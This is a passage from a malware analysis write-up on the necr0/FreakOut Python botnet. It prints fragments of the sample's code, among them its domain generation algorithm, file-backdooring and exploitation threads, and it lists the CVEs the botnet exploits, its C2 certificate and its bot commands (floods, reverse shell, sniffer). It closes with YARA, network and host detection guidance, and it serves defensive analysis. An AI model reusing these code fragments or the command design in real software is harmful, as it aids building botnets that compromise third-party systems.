</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>                <span style=color:#fb660a;font-weight:700>if</span> <span style=color:#0086d2>&#34;node&#34;</span> not in filenameToBackdoor and <span style=color:#0086d2>&#39;lib&#39;</span> not in filenameToBackdoor and <span style=color:#0086d2>&#34;npm&#34;</span> not in filenameToBackdoor and filenameToBackdoor != <span style=color:#0086d2>&#34;&#34;</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>                    self.backdoorFile(filenameToBackdoor)
</span></span></code></pre></div><p>We did not identify the external malicious javascript file because its domain seems to be loaded during runtime by the command and control server.</p><h3 id=domain-algorithm-generator>Domain Algorithm Generator</h3><p>To combat C2 takedowns, the malware includes a <em>domain algorithm generator (DAG)</em> which dynamically and deterministically computes the C2 address. If one domain gets taken down, the malware operator can just activate the next domain. The upside is that malware analysts can discover these methods and compute the same domain list and start blocking domains.</p><p>The following shows the DAG:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>bxsHTdxPUds</span>(integer16):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>    <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086d2>&#39;&#39;</span>.join(random.choice(<span style=color:#0086d2>&#34;abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>) <span style=color:#fb660a;font-weight:700>for</span> _ in range(integer16))
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span><span style=color:#fb660a;font-weight:700>def</span> <span style=color:#ff0086;font-weight:700>ZzoOnYUl</span>(integerBetween0And4096):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic># Make sure to run this with python2</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic># python3 &#34;random.seed()&#34; will generate differently</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span>    random.seed(a=<span style=color:#0086f7;font-weight:700>5236442</span>+integerBetween0And4096)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8</span><span>    <span style=color:#fb660a;font-weight:700>return</span> bxsHTdxPUds(<span style=color:#0086f7;font-weight:700>16</span>)+<span style=color:#0086d2>&#34;.xyz&#34;</span>
</span></span></code></pre></div><p>This will deterministically generate 4096 domains:</p><pre tabindex=0><code>avEiXUcYimXwcMph.xyz
aoRmVwOaTOGgYqbk.xyz
MasEdcNVYwedJwVd.xyz
suBYdZaoqwveKRlQ.xyz
ZNHfaHSaxpBSfJdi.xyz
EJzkiGWBTnLGdASR.xyz
nCBOoENvcXDGKqoX.xyz
[...]
</code></pre><p>The full list of domains can be found <a href=dag.txt>here</a>.</p><h2 id=mass-exploitation>Mass Exploitation</h2><p>Next the malware will try to start <code>CPU_COUNT * 10</code> number of threads running a method that will generate random IPs which it then will try to attack, using a predefined list of exploit payloads.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#fb660a;font-weight:700>for</span> _ in range(multiprocessing.cpu_count() * <span style=color:#0086f7;font-weight:700>10</span>):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>    <span style=color:#fb660a;font-weight:700>try</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>        threading.Thread(target=self.hlUmvujv).start()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>    <span style=color:#fb660a;font-weight:700>except</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>        <span style=color:#fb660a;font-weight:700>pass</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>self.sfAxqaAqh() &lt;--- Try running this?? 
</span></span></code></pre></div><p>The malware will try to exploit the following vulnerabilities.</p><ul><li><a href=https://nvd.nist.gov/vuln/detail/CVE-2020-28188>CVE-2020-28188 TerraMaster TOS</a></li><li><a href=https://nvd.nist.gov/vuln/detail/CVE-2021-3007>CVE-2021-3007 Zend Framework</a></li><li><a href=https://nvd.nist.gov/vuln/detail/CVE-2020-7961>CVE-2020-7961 Liferay</a></li><li><a href=https://nvd.nist.gov/vuln/detail/CVE-2018-7600>CVE-2018-7600 Drupal</a></li><li><a href=https://nvd.nist.gov/vuln/detail/CVE-2017-14404>CVE-2017-14404 EyesOfNetwork</a></li><li><a href=https://nvd.nist.gov/vuln/detail/CVE-2020-35131>CVE-2020-35131 Cockpit</a></li><li>Gila CMS 2.0.0 - Remote Code Execution</li><li><a href=https://nvd.nist.gov/vuln/detail/CVE-2020-35729>2020-35729 KLog Server</a></li></ul><p>I was surprised by this design because how likely is it that a randomly generated IP is running one or more vulnerable services? Apparently enough.</p><h2 id=command-and-control>Command and Control</h2><p>After executing the exploitation phase, the malware will connect to the IRC command and control server using SSL/TLS. Once connected, the host will become a zombie, part of the global botnet.</p><p>The malware includes a hardcoded <code>x.509</code> certificate and corresponding private key. These files are dropped on the system and used for communicating with the C2.</p><pre tabindex=0><code>Version:          3 (0x02)
Serial number:    79074883743393278476520399280442039870974936087 (0x0dd9d725d4aa0e43fae64f68887d3a6aa6c54417)
Algorithm ID:     SHA256withRSA
Validity
  Not Before:     16/01/2021 22:10:18 (dd-mm-yyyy hh:mm:ss) (210116221018Z)
  Not After:      16/01/2022 22:10:18 (dd-mm-yyyy hh:mm:ss) (220116221018Z)
Issuer
  C  = 00
  ST = -
  L  = your box
  O  = Kek Security
  OU = Operations
  CN = netloader.kek.org
  E  = freakanon@riseup.net
Subject
  C  = 00
  ST = -
  L  = your box
  O  = Kek Security
  OU = Operations
  CN = netloader.kek.org
  E  = freakanon@riseup.net
Public Key
  Algorithm:      RSA
  Length:         2048 bits
  Modulus:        a9:25:7c:da:cb:f9:38:0c:82:90:82:99:0a:f9:2a:f2:
                  4b:3c:38:95:29:4e:7c:1f:fe:5d:7e:b6:45:1b:89:ec:
                  2b:b2:75:d3:1e:ec:c0:4f:ae:08:24:b7:f8:fe:07:86:
                  8e:44:6f:10:c2:b4:4b:43:b4:91:c3:93:c7:73:36:a3:
                  04:12:ed:ee:14:47:b9:b9:69:6d:11:1e:a2:d5:54:e2:
                  19:42:cf:bd:30:3d:d1:9a:e9:df:33:6f:0b:22:0f:d4:
                  4a:e6:49:ba:29:1e:6a:7f:4a:20:81:60:f6:ed:9e:9c:
                  2b:01:29:51:a4:5c:09:ad:d6:70:57:04:6c:62:97:7f:
                  ca:80:b0:5d:ce:e5:ef:d1:4c:6b:7c:e7:9d:34:99:0b:
                  d0:0e:25:5e:e1:fb:e6:a0:82:6e:4b:a1:3d:54:0e:8c:
                  f3:c5:9a:e4:e0:0d:3b:1f:4e:56:28:ec:0a:ee:75:e3:
                  ed:ba:42:a9:23:25:5e:07:26:b6:a2:02:ea:01:83:2f:
                  3d:22:1b:ec:6c:68:8a:b2:f6:39:0e:bf:91:56:a3:ef:
                  2c:bc:61:92:06:cc:44:a6:ce:0f:7d:6e:13:2f:51:78:
                  9c:b8:f3:fb:39:18:6c:ba:ef:cc:79:65:5e:4a:94:0b:
                  3f:35:f6:4f:dc:a7:21:49:fa:dc:cb:61:8b:aa:35:a7
  Exponent:       65537 (0x10001)
Certificate Signature
  Algorithm:      SHA256withRSA
  Signature:      24:9b:02:8c:a0:e3:31:4a:4a:6f:f4:7e:58:fd:f6:aa:
                  2d:3f:de:ee:40:86:7f:5b:c3:4d:12:ae:90:1e:7a:06:
                  41:e1:b6:f4:d3:d3:44:a1:c3:b7:df:49:eb:3e:d8:b7:
                  82:3d:43:b7:4c:0b:12:6d:51:a6:2c:44:13:00:9a:a6:
                  86:a6:26:4a:70:5a:f6:ca:6d:9f:91:df:62:69:fe:3f:
                  5e:44:96:a1:c2:e6:d8:69:59:f6:f5:2f:64:d2:47:db:
                  ba:d6:e0:fb:ee:0b:17:2b:29:eb:66:30:0f:fc:26:54:
                  64:84:89:3c:61:a3:2e:c9:66:d2:74:03:fd:9c:13:5d:
                  17:16:2f:b0:56:9b:17:b1:1a:29:e9:84:01:22:48:22:
                  ec:03:f7:7a:0a:79:85:2d:e5:f3:0c:9c:a0:1d:e5:94:
                  62:15:fa:8e:76:49:ce:4e:9e:e6:ff:fb:b6:d0:8f:67:
                  5f:aa:d5:ec:de:18:d3:f9:53:af:90:ea:2f:73:84:e2:
                  4c:4b:c5:95:5f:11:c9:fd:24:c3:9c:b0:87:b0:e7:52:
                  6d:da:6b:bf:0e:e2:a9:ef:54:f3:30:e5:12:7c:69:cf:
                  6c:b9:ee:b7:55:91:5c:65:9b:00:17:89:5d:cb:6a:1a:
                  48:51:28:3f:70:46:f5:2c:27:39:b0:d5:91:e6:7d:f5

Extensions
  subjectKeyIdentifier :
    1b0b5e59d8903ed7a24920ea608b36712e744d37
  authorityKeyIdentifier :
    kid=1b0b5e59d8903ed7a24920ea608b36712e744d37
  basicConstraints CRITICAL:
    cA=true
</code></pre><p>Once connection has been established, an infected host will identify itself as:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>self.ircVictimNick=<span style=color:#0086d2>&#34;[HAX|&#34;</span>+platform.system()+<span style=color:#0086d2>&#34;|&#34;</span>+platform.machine()+<span style=color:#0086d2>&#34;|&#34;</span>+str(multiprocessing.cpu_count())+<span style=color:#0086d2>&#34;]&#34;</span>+str(self.randomString)
</span></span></code></pre></div><p>Channel names and passwords seems to be dynamically loaded when the malware first connects to the C2 server. Because the C2 server is not responding at the moment, we can not extract this information.</p><p>Once the infected host is part of the botnet, it is ready to receive commands. The following is a list of commands that the malware accepts:</p><ul><li>logout</li><li>udpflood</li><li>synflood</li><li>tcpflood</li><li>slowloris</li><li>httpflood</li><li>loadamp</li><li>reconnect</li><li>reflect</li><li>addport <em>(add additional ports to scan)</em></li><li>delport <em>(remove ports to scan)</em></li><li>ports <em>(show which ports currently being scanned)</em></li><li>injectcount <em>(how many files have been infected)</em></li><li>reinject <em>(reinfect files)</em></li><li>scanner</li><li>sniffer <em>(perform man in the middle attack using ARP poisoning)</em></li><li>scannetrange</li><li>scanstats</li><li>clearscan</li><li>revshell</li><li>shell</li><li>download</li><li>killnight <em>(terminate the program)</em></li><li>execute</li><li>killbyname</li><li>killbypid</li><li>disable <em>(disable scans and attacks)</em></li><li>getip</li><li>ram</li><li>updatecmd</li><li>info</li><li>repack <em>(re-polymorph)</em></li></ul><p>The malware does provide a lot of functionality. The most interesting part is the fact that it includes a man-in-the-middle sniffer. The sniffed packets would be sent back to the C2 server.</p><h2 id=detections>Detections</h2><p>Below are a few detection techniques that can be used to detect this malware in a network or on a computer.</p><h3 id=yara>Yara</h3><p>This yara rule will match the encoded SSL certificate embedded in the program as well as they XOR key found in this sample. Some samples may have a differet XOR key however.</p><pre tabindex=0><code>rule necr0Malware
{

    meta:
        author = &#34;KITS&#34;
        description = &#34;Detect necr0/Freak/Keksec python malware.&#34;
        last_modified = &#34;2021-02-18&#34;
        reference_url1 = &#34;https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/&#34;
        reference_url2 = &#34;https://blog.netlab.360.com/necro/&#34;

    strings:
        $hex_string = &#34;\x78\x9c\x01\x4a\x00\xb5\xff\x99\x58\x74\x10\x01\x9b\x16\x73\xad\x04\x9f\xb5\x19&#34;
        $xor_key_string = &#34;212, 55, 14, 121, 109, 247, 119, 92, 152, 42, 175, 149, 49, 242, 43, 70, 250, 248, 68&#34;

    condition:
        any of them 
}
</code></pre><h3 id=network>Network</h3><p>Assuming you log and store SSL/TLS metadata, search for connections containing the following data:</p><pre tabindex=0><code>Subject
  C  = 00
  ST = -
  L  = your box
  O  = Kek Security
  OU = Operations
  CN = netloader.kek.org
  E  = freakanon@riseup.net
</code></pre><p>You also check if there exists any DNS lookups to any domains found in this <a href=dag.txt>list</a>.</p><h3 id=os>OS</h3><p>These are some steps you can take to ensure that you have not been infected.</p><ul><li>Any modifications to <code>/etc/rc.local</code> should be investigated.</li><li>Has your name servers been changed? Check <code>/etc/resolv.conf</code></li><li>If /etc/boot exists, verify it is not malware</li></ul><h2 id=conclusion>Conclusion</h2><p>This was an interesting sample to analyse, both from a developer- and security perspective. The developer of this malware wraps almost everything in try/catch statements and depends on Python2 to be installed, which is end of life. The number of infected hosts would probably be higher if the author supported both Python 2 and version 3. The polymorphic engine was clever, we&rsquo;ll probably see more of this in python malware in the feature.</p><p>From a security perspective, the malware is not advanced. It seems more like a <em>hit n&rsquo; run</em> malware which you use to drop cryptocurrency miners or use to DDOS online services. The malware tries to achieve persistence by infecting files in <code>/etc/</code>, but this will only work if the user running the malware is <code>root</code>. In monitored environments, the malware is quite noisy as well. Using IRC as CnC would most likely light up as a Christmas tree if such traffic is not common. Also, trying to hijack <code>/etc/rc.local</code> would also trigger some alarms. Yet, this malware has had great success. The reason for this is that it has managed to infect a lot of non-monitored systems hosting out-dated software.</p><p>A full technical report of this malware family can also be found at <a href=https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/>CheckPoint Research</a> and <a href=https://blog.netlab.360.com/necro/>https://blog.netlab.360.com/necro/</a>.</p><p>EOF.</p></div></div></div></article></div></div><footer></footer></div><script src=/js/particles.min.js defer></script><script src=/js/particles.conf.js defer></script><script src=/js/baffle.min.js async></script><script src=/js/main.js defer async></script></body></html>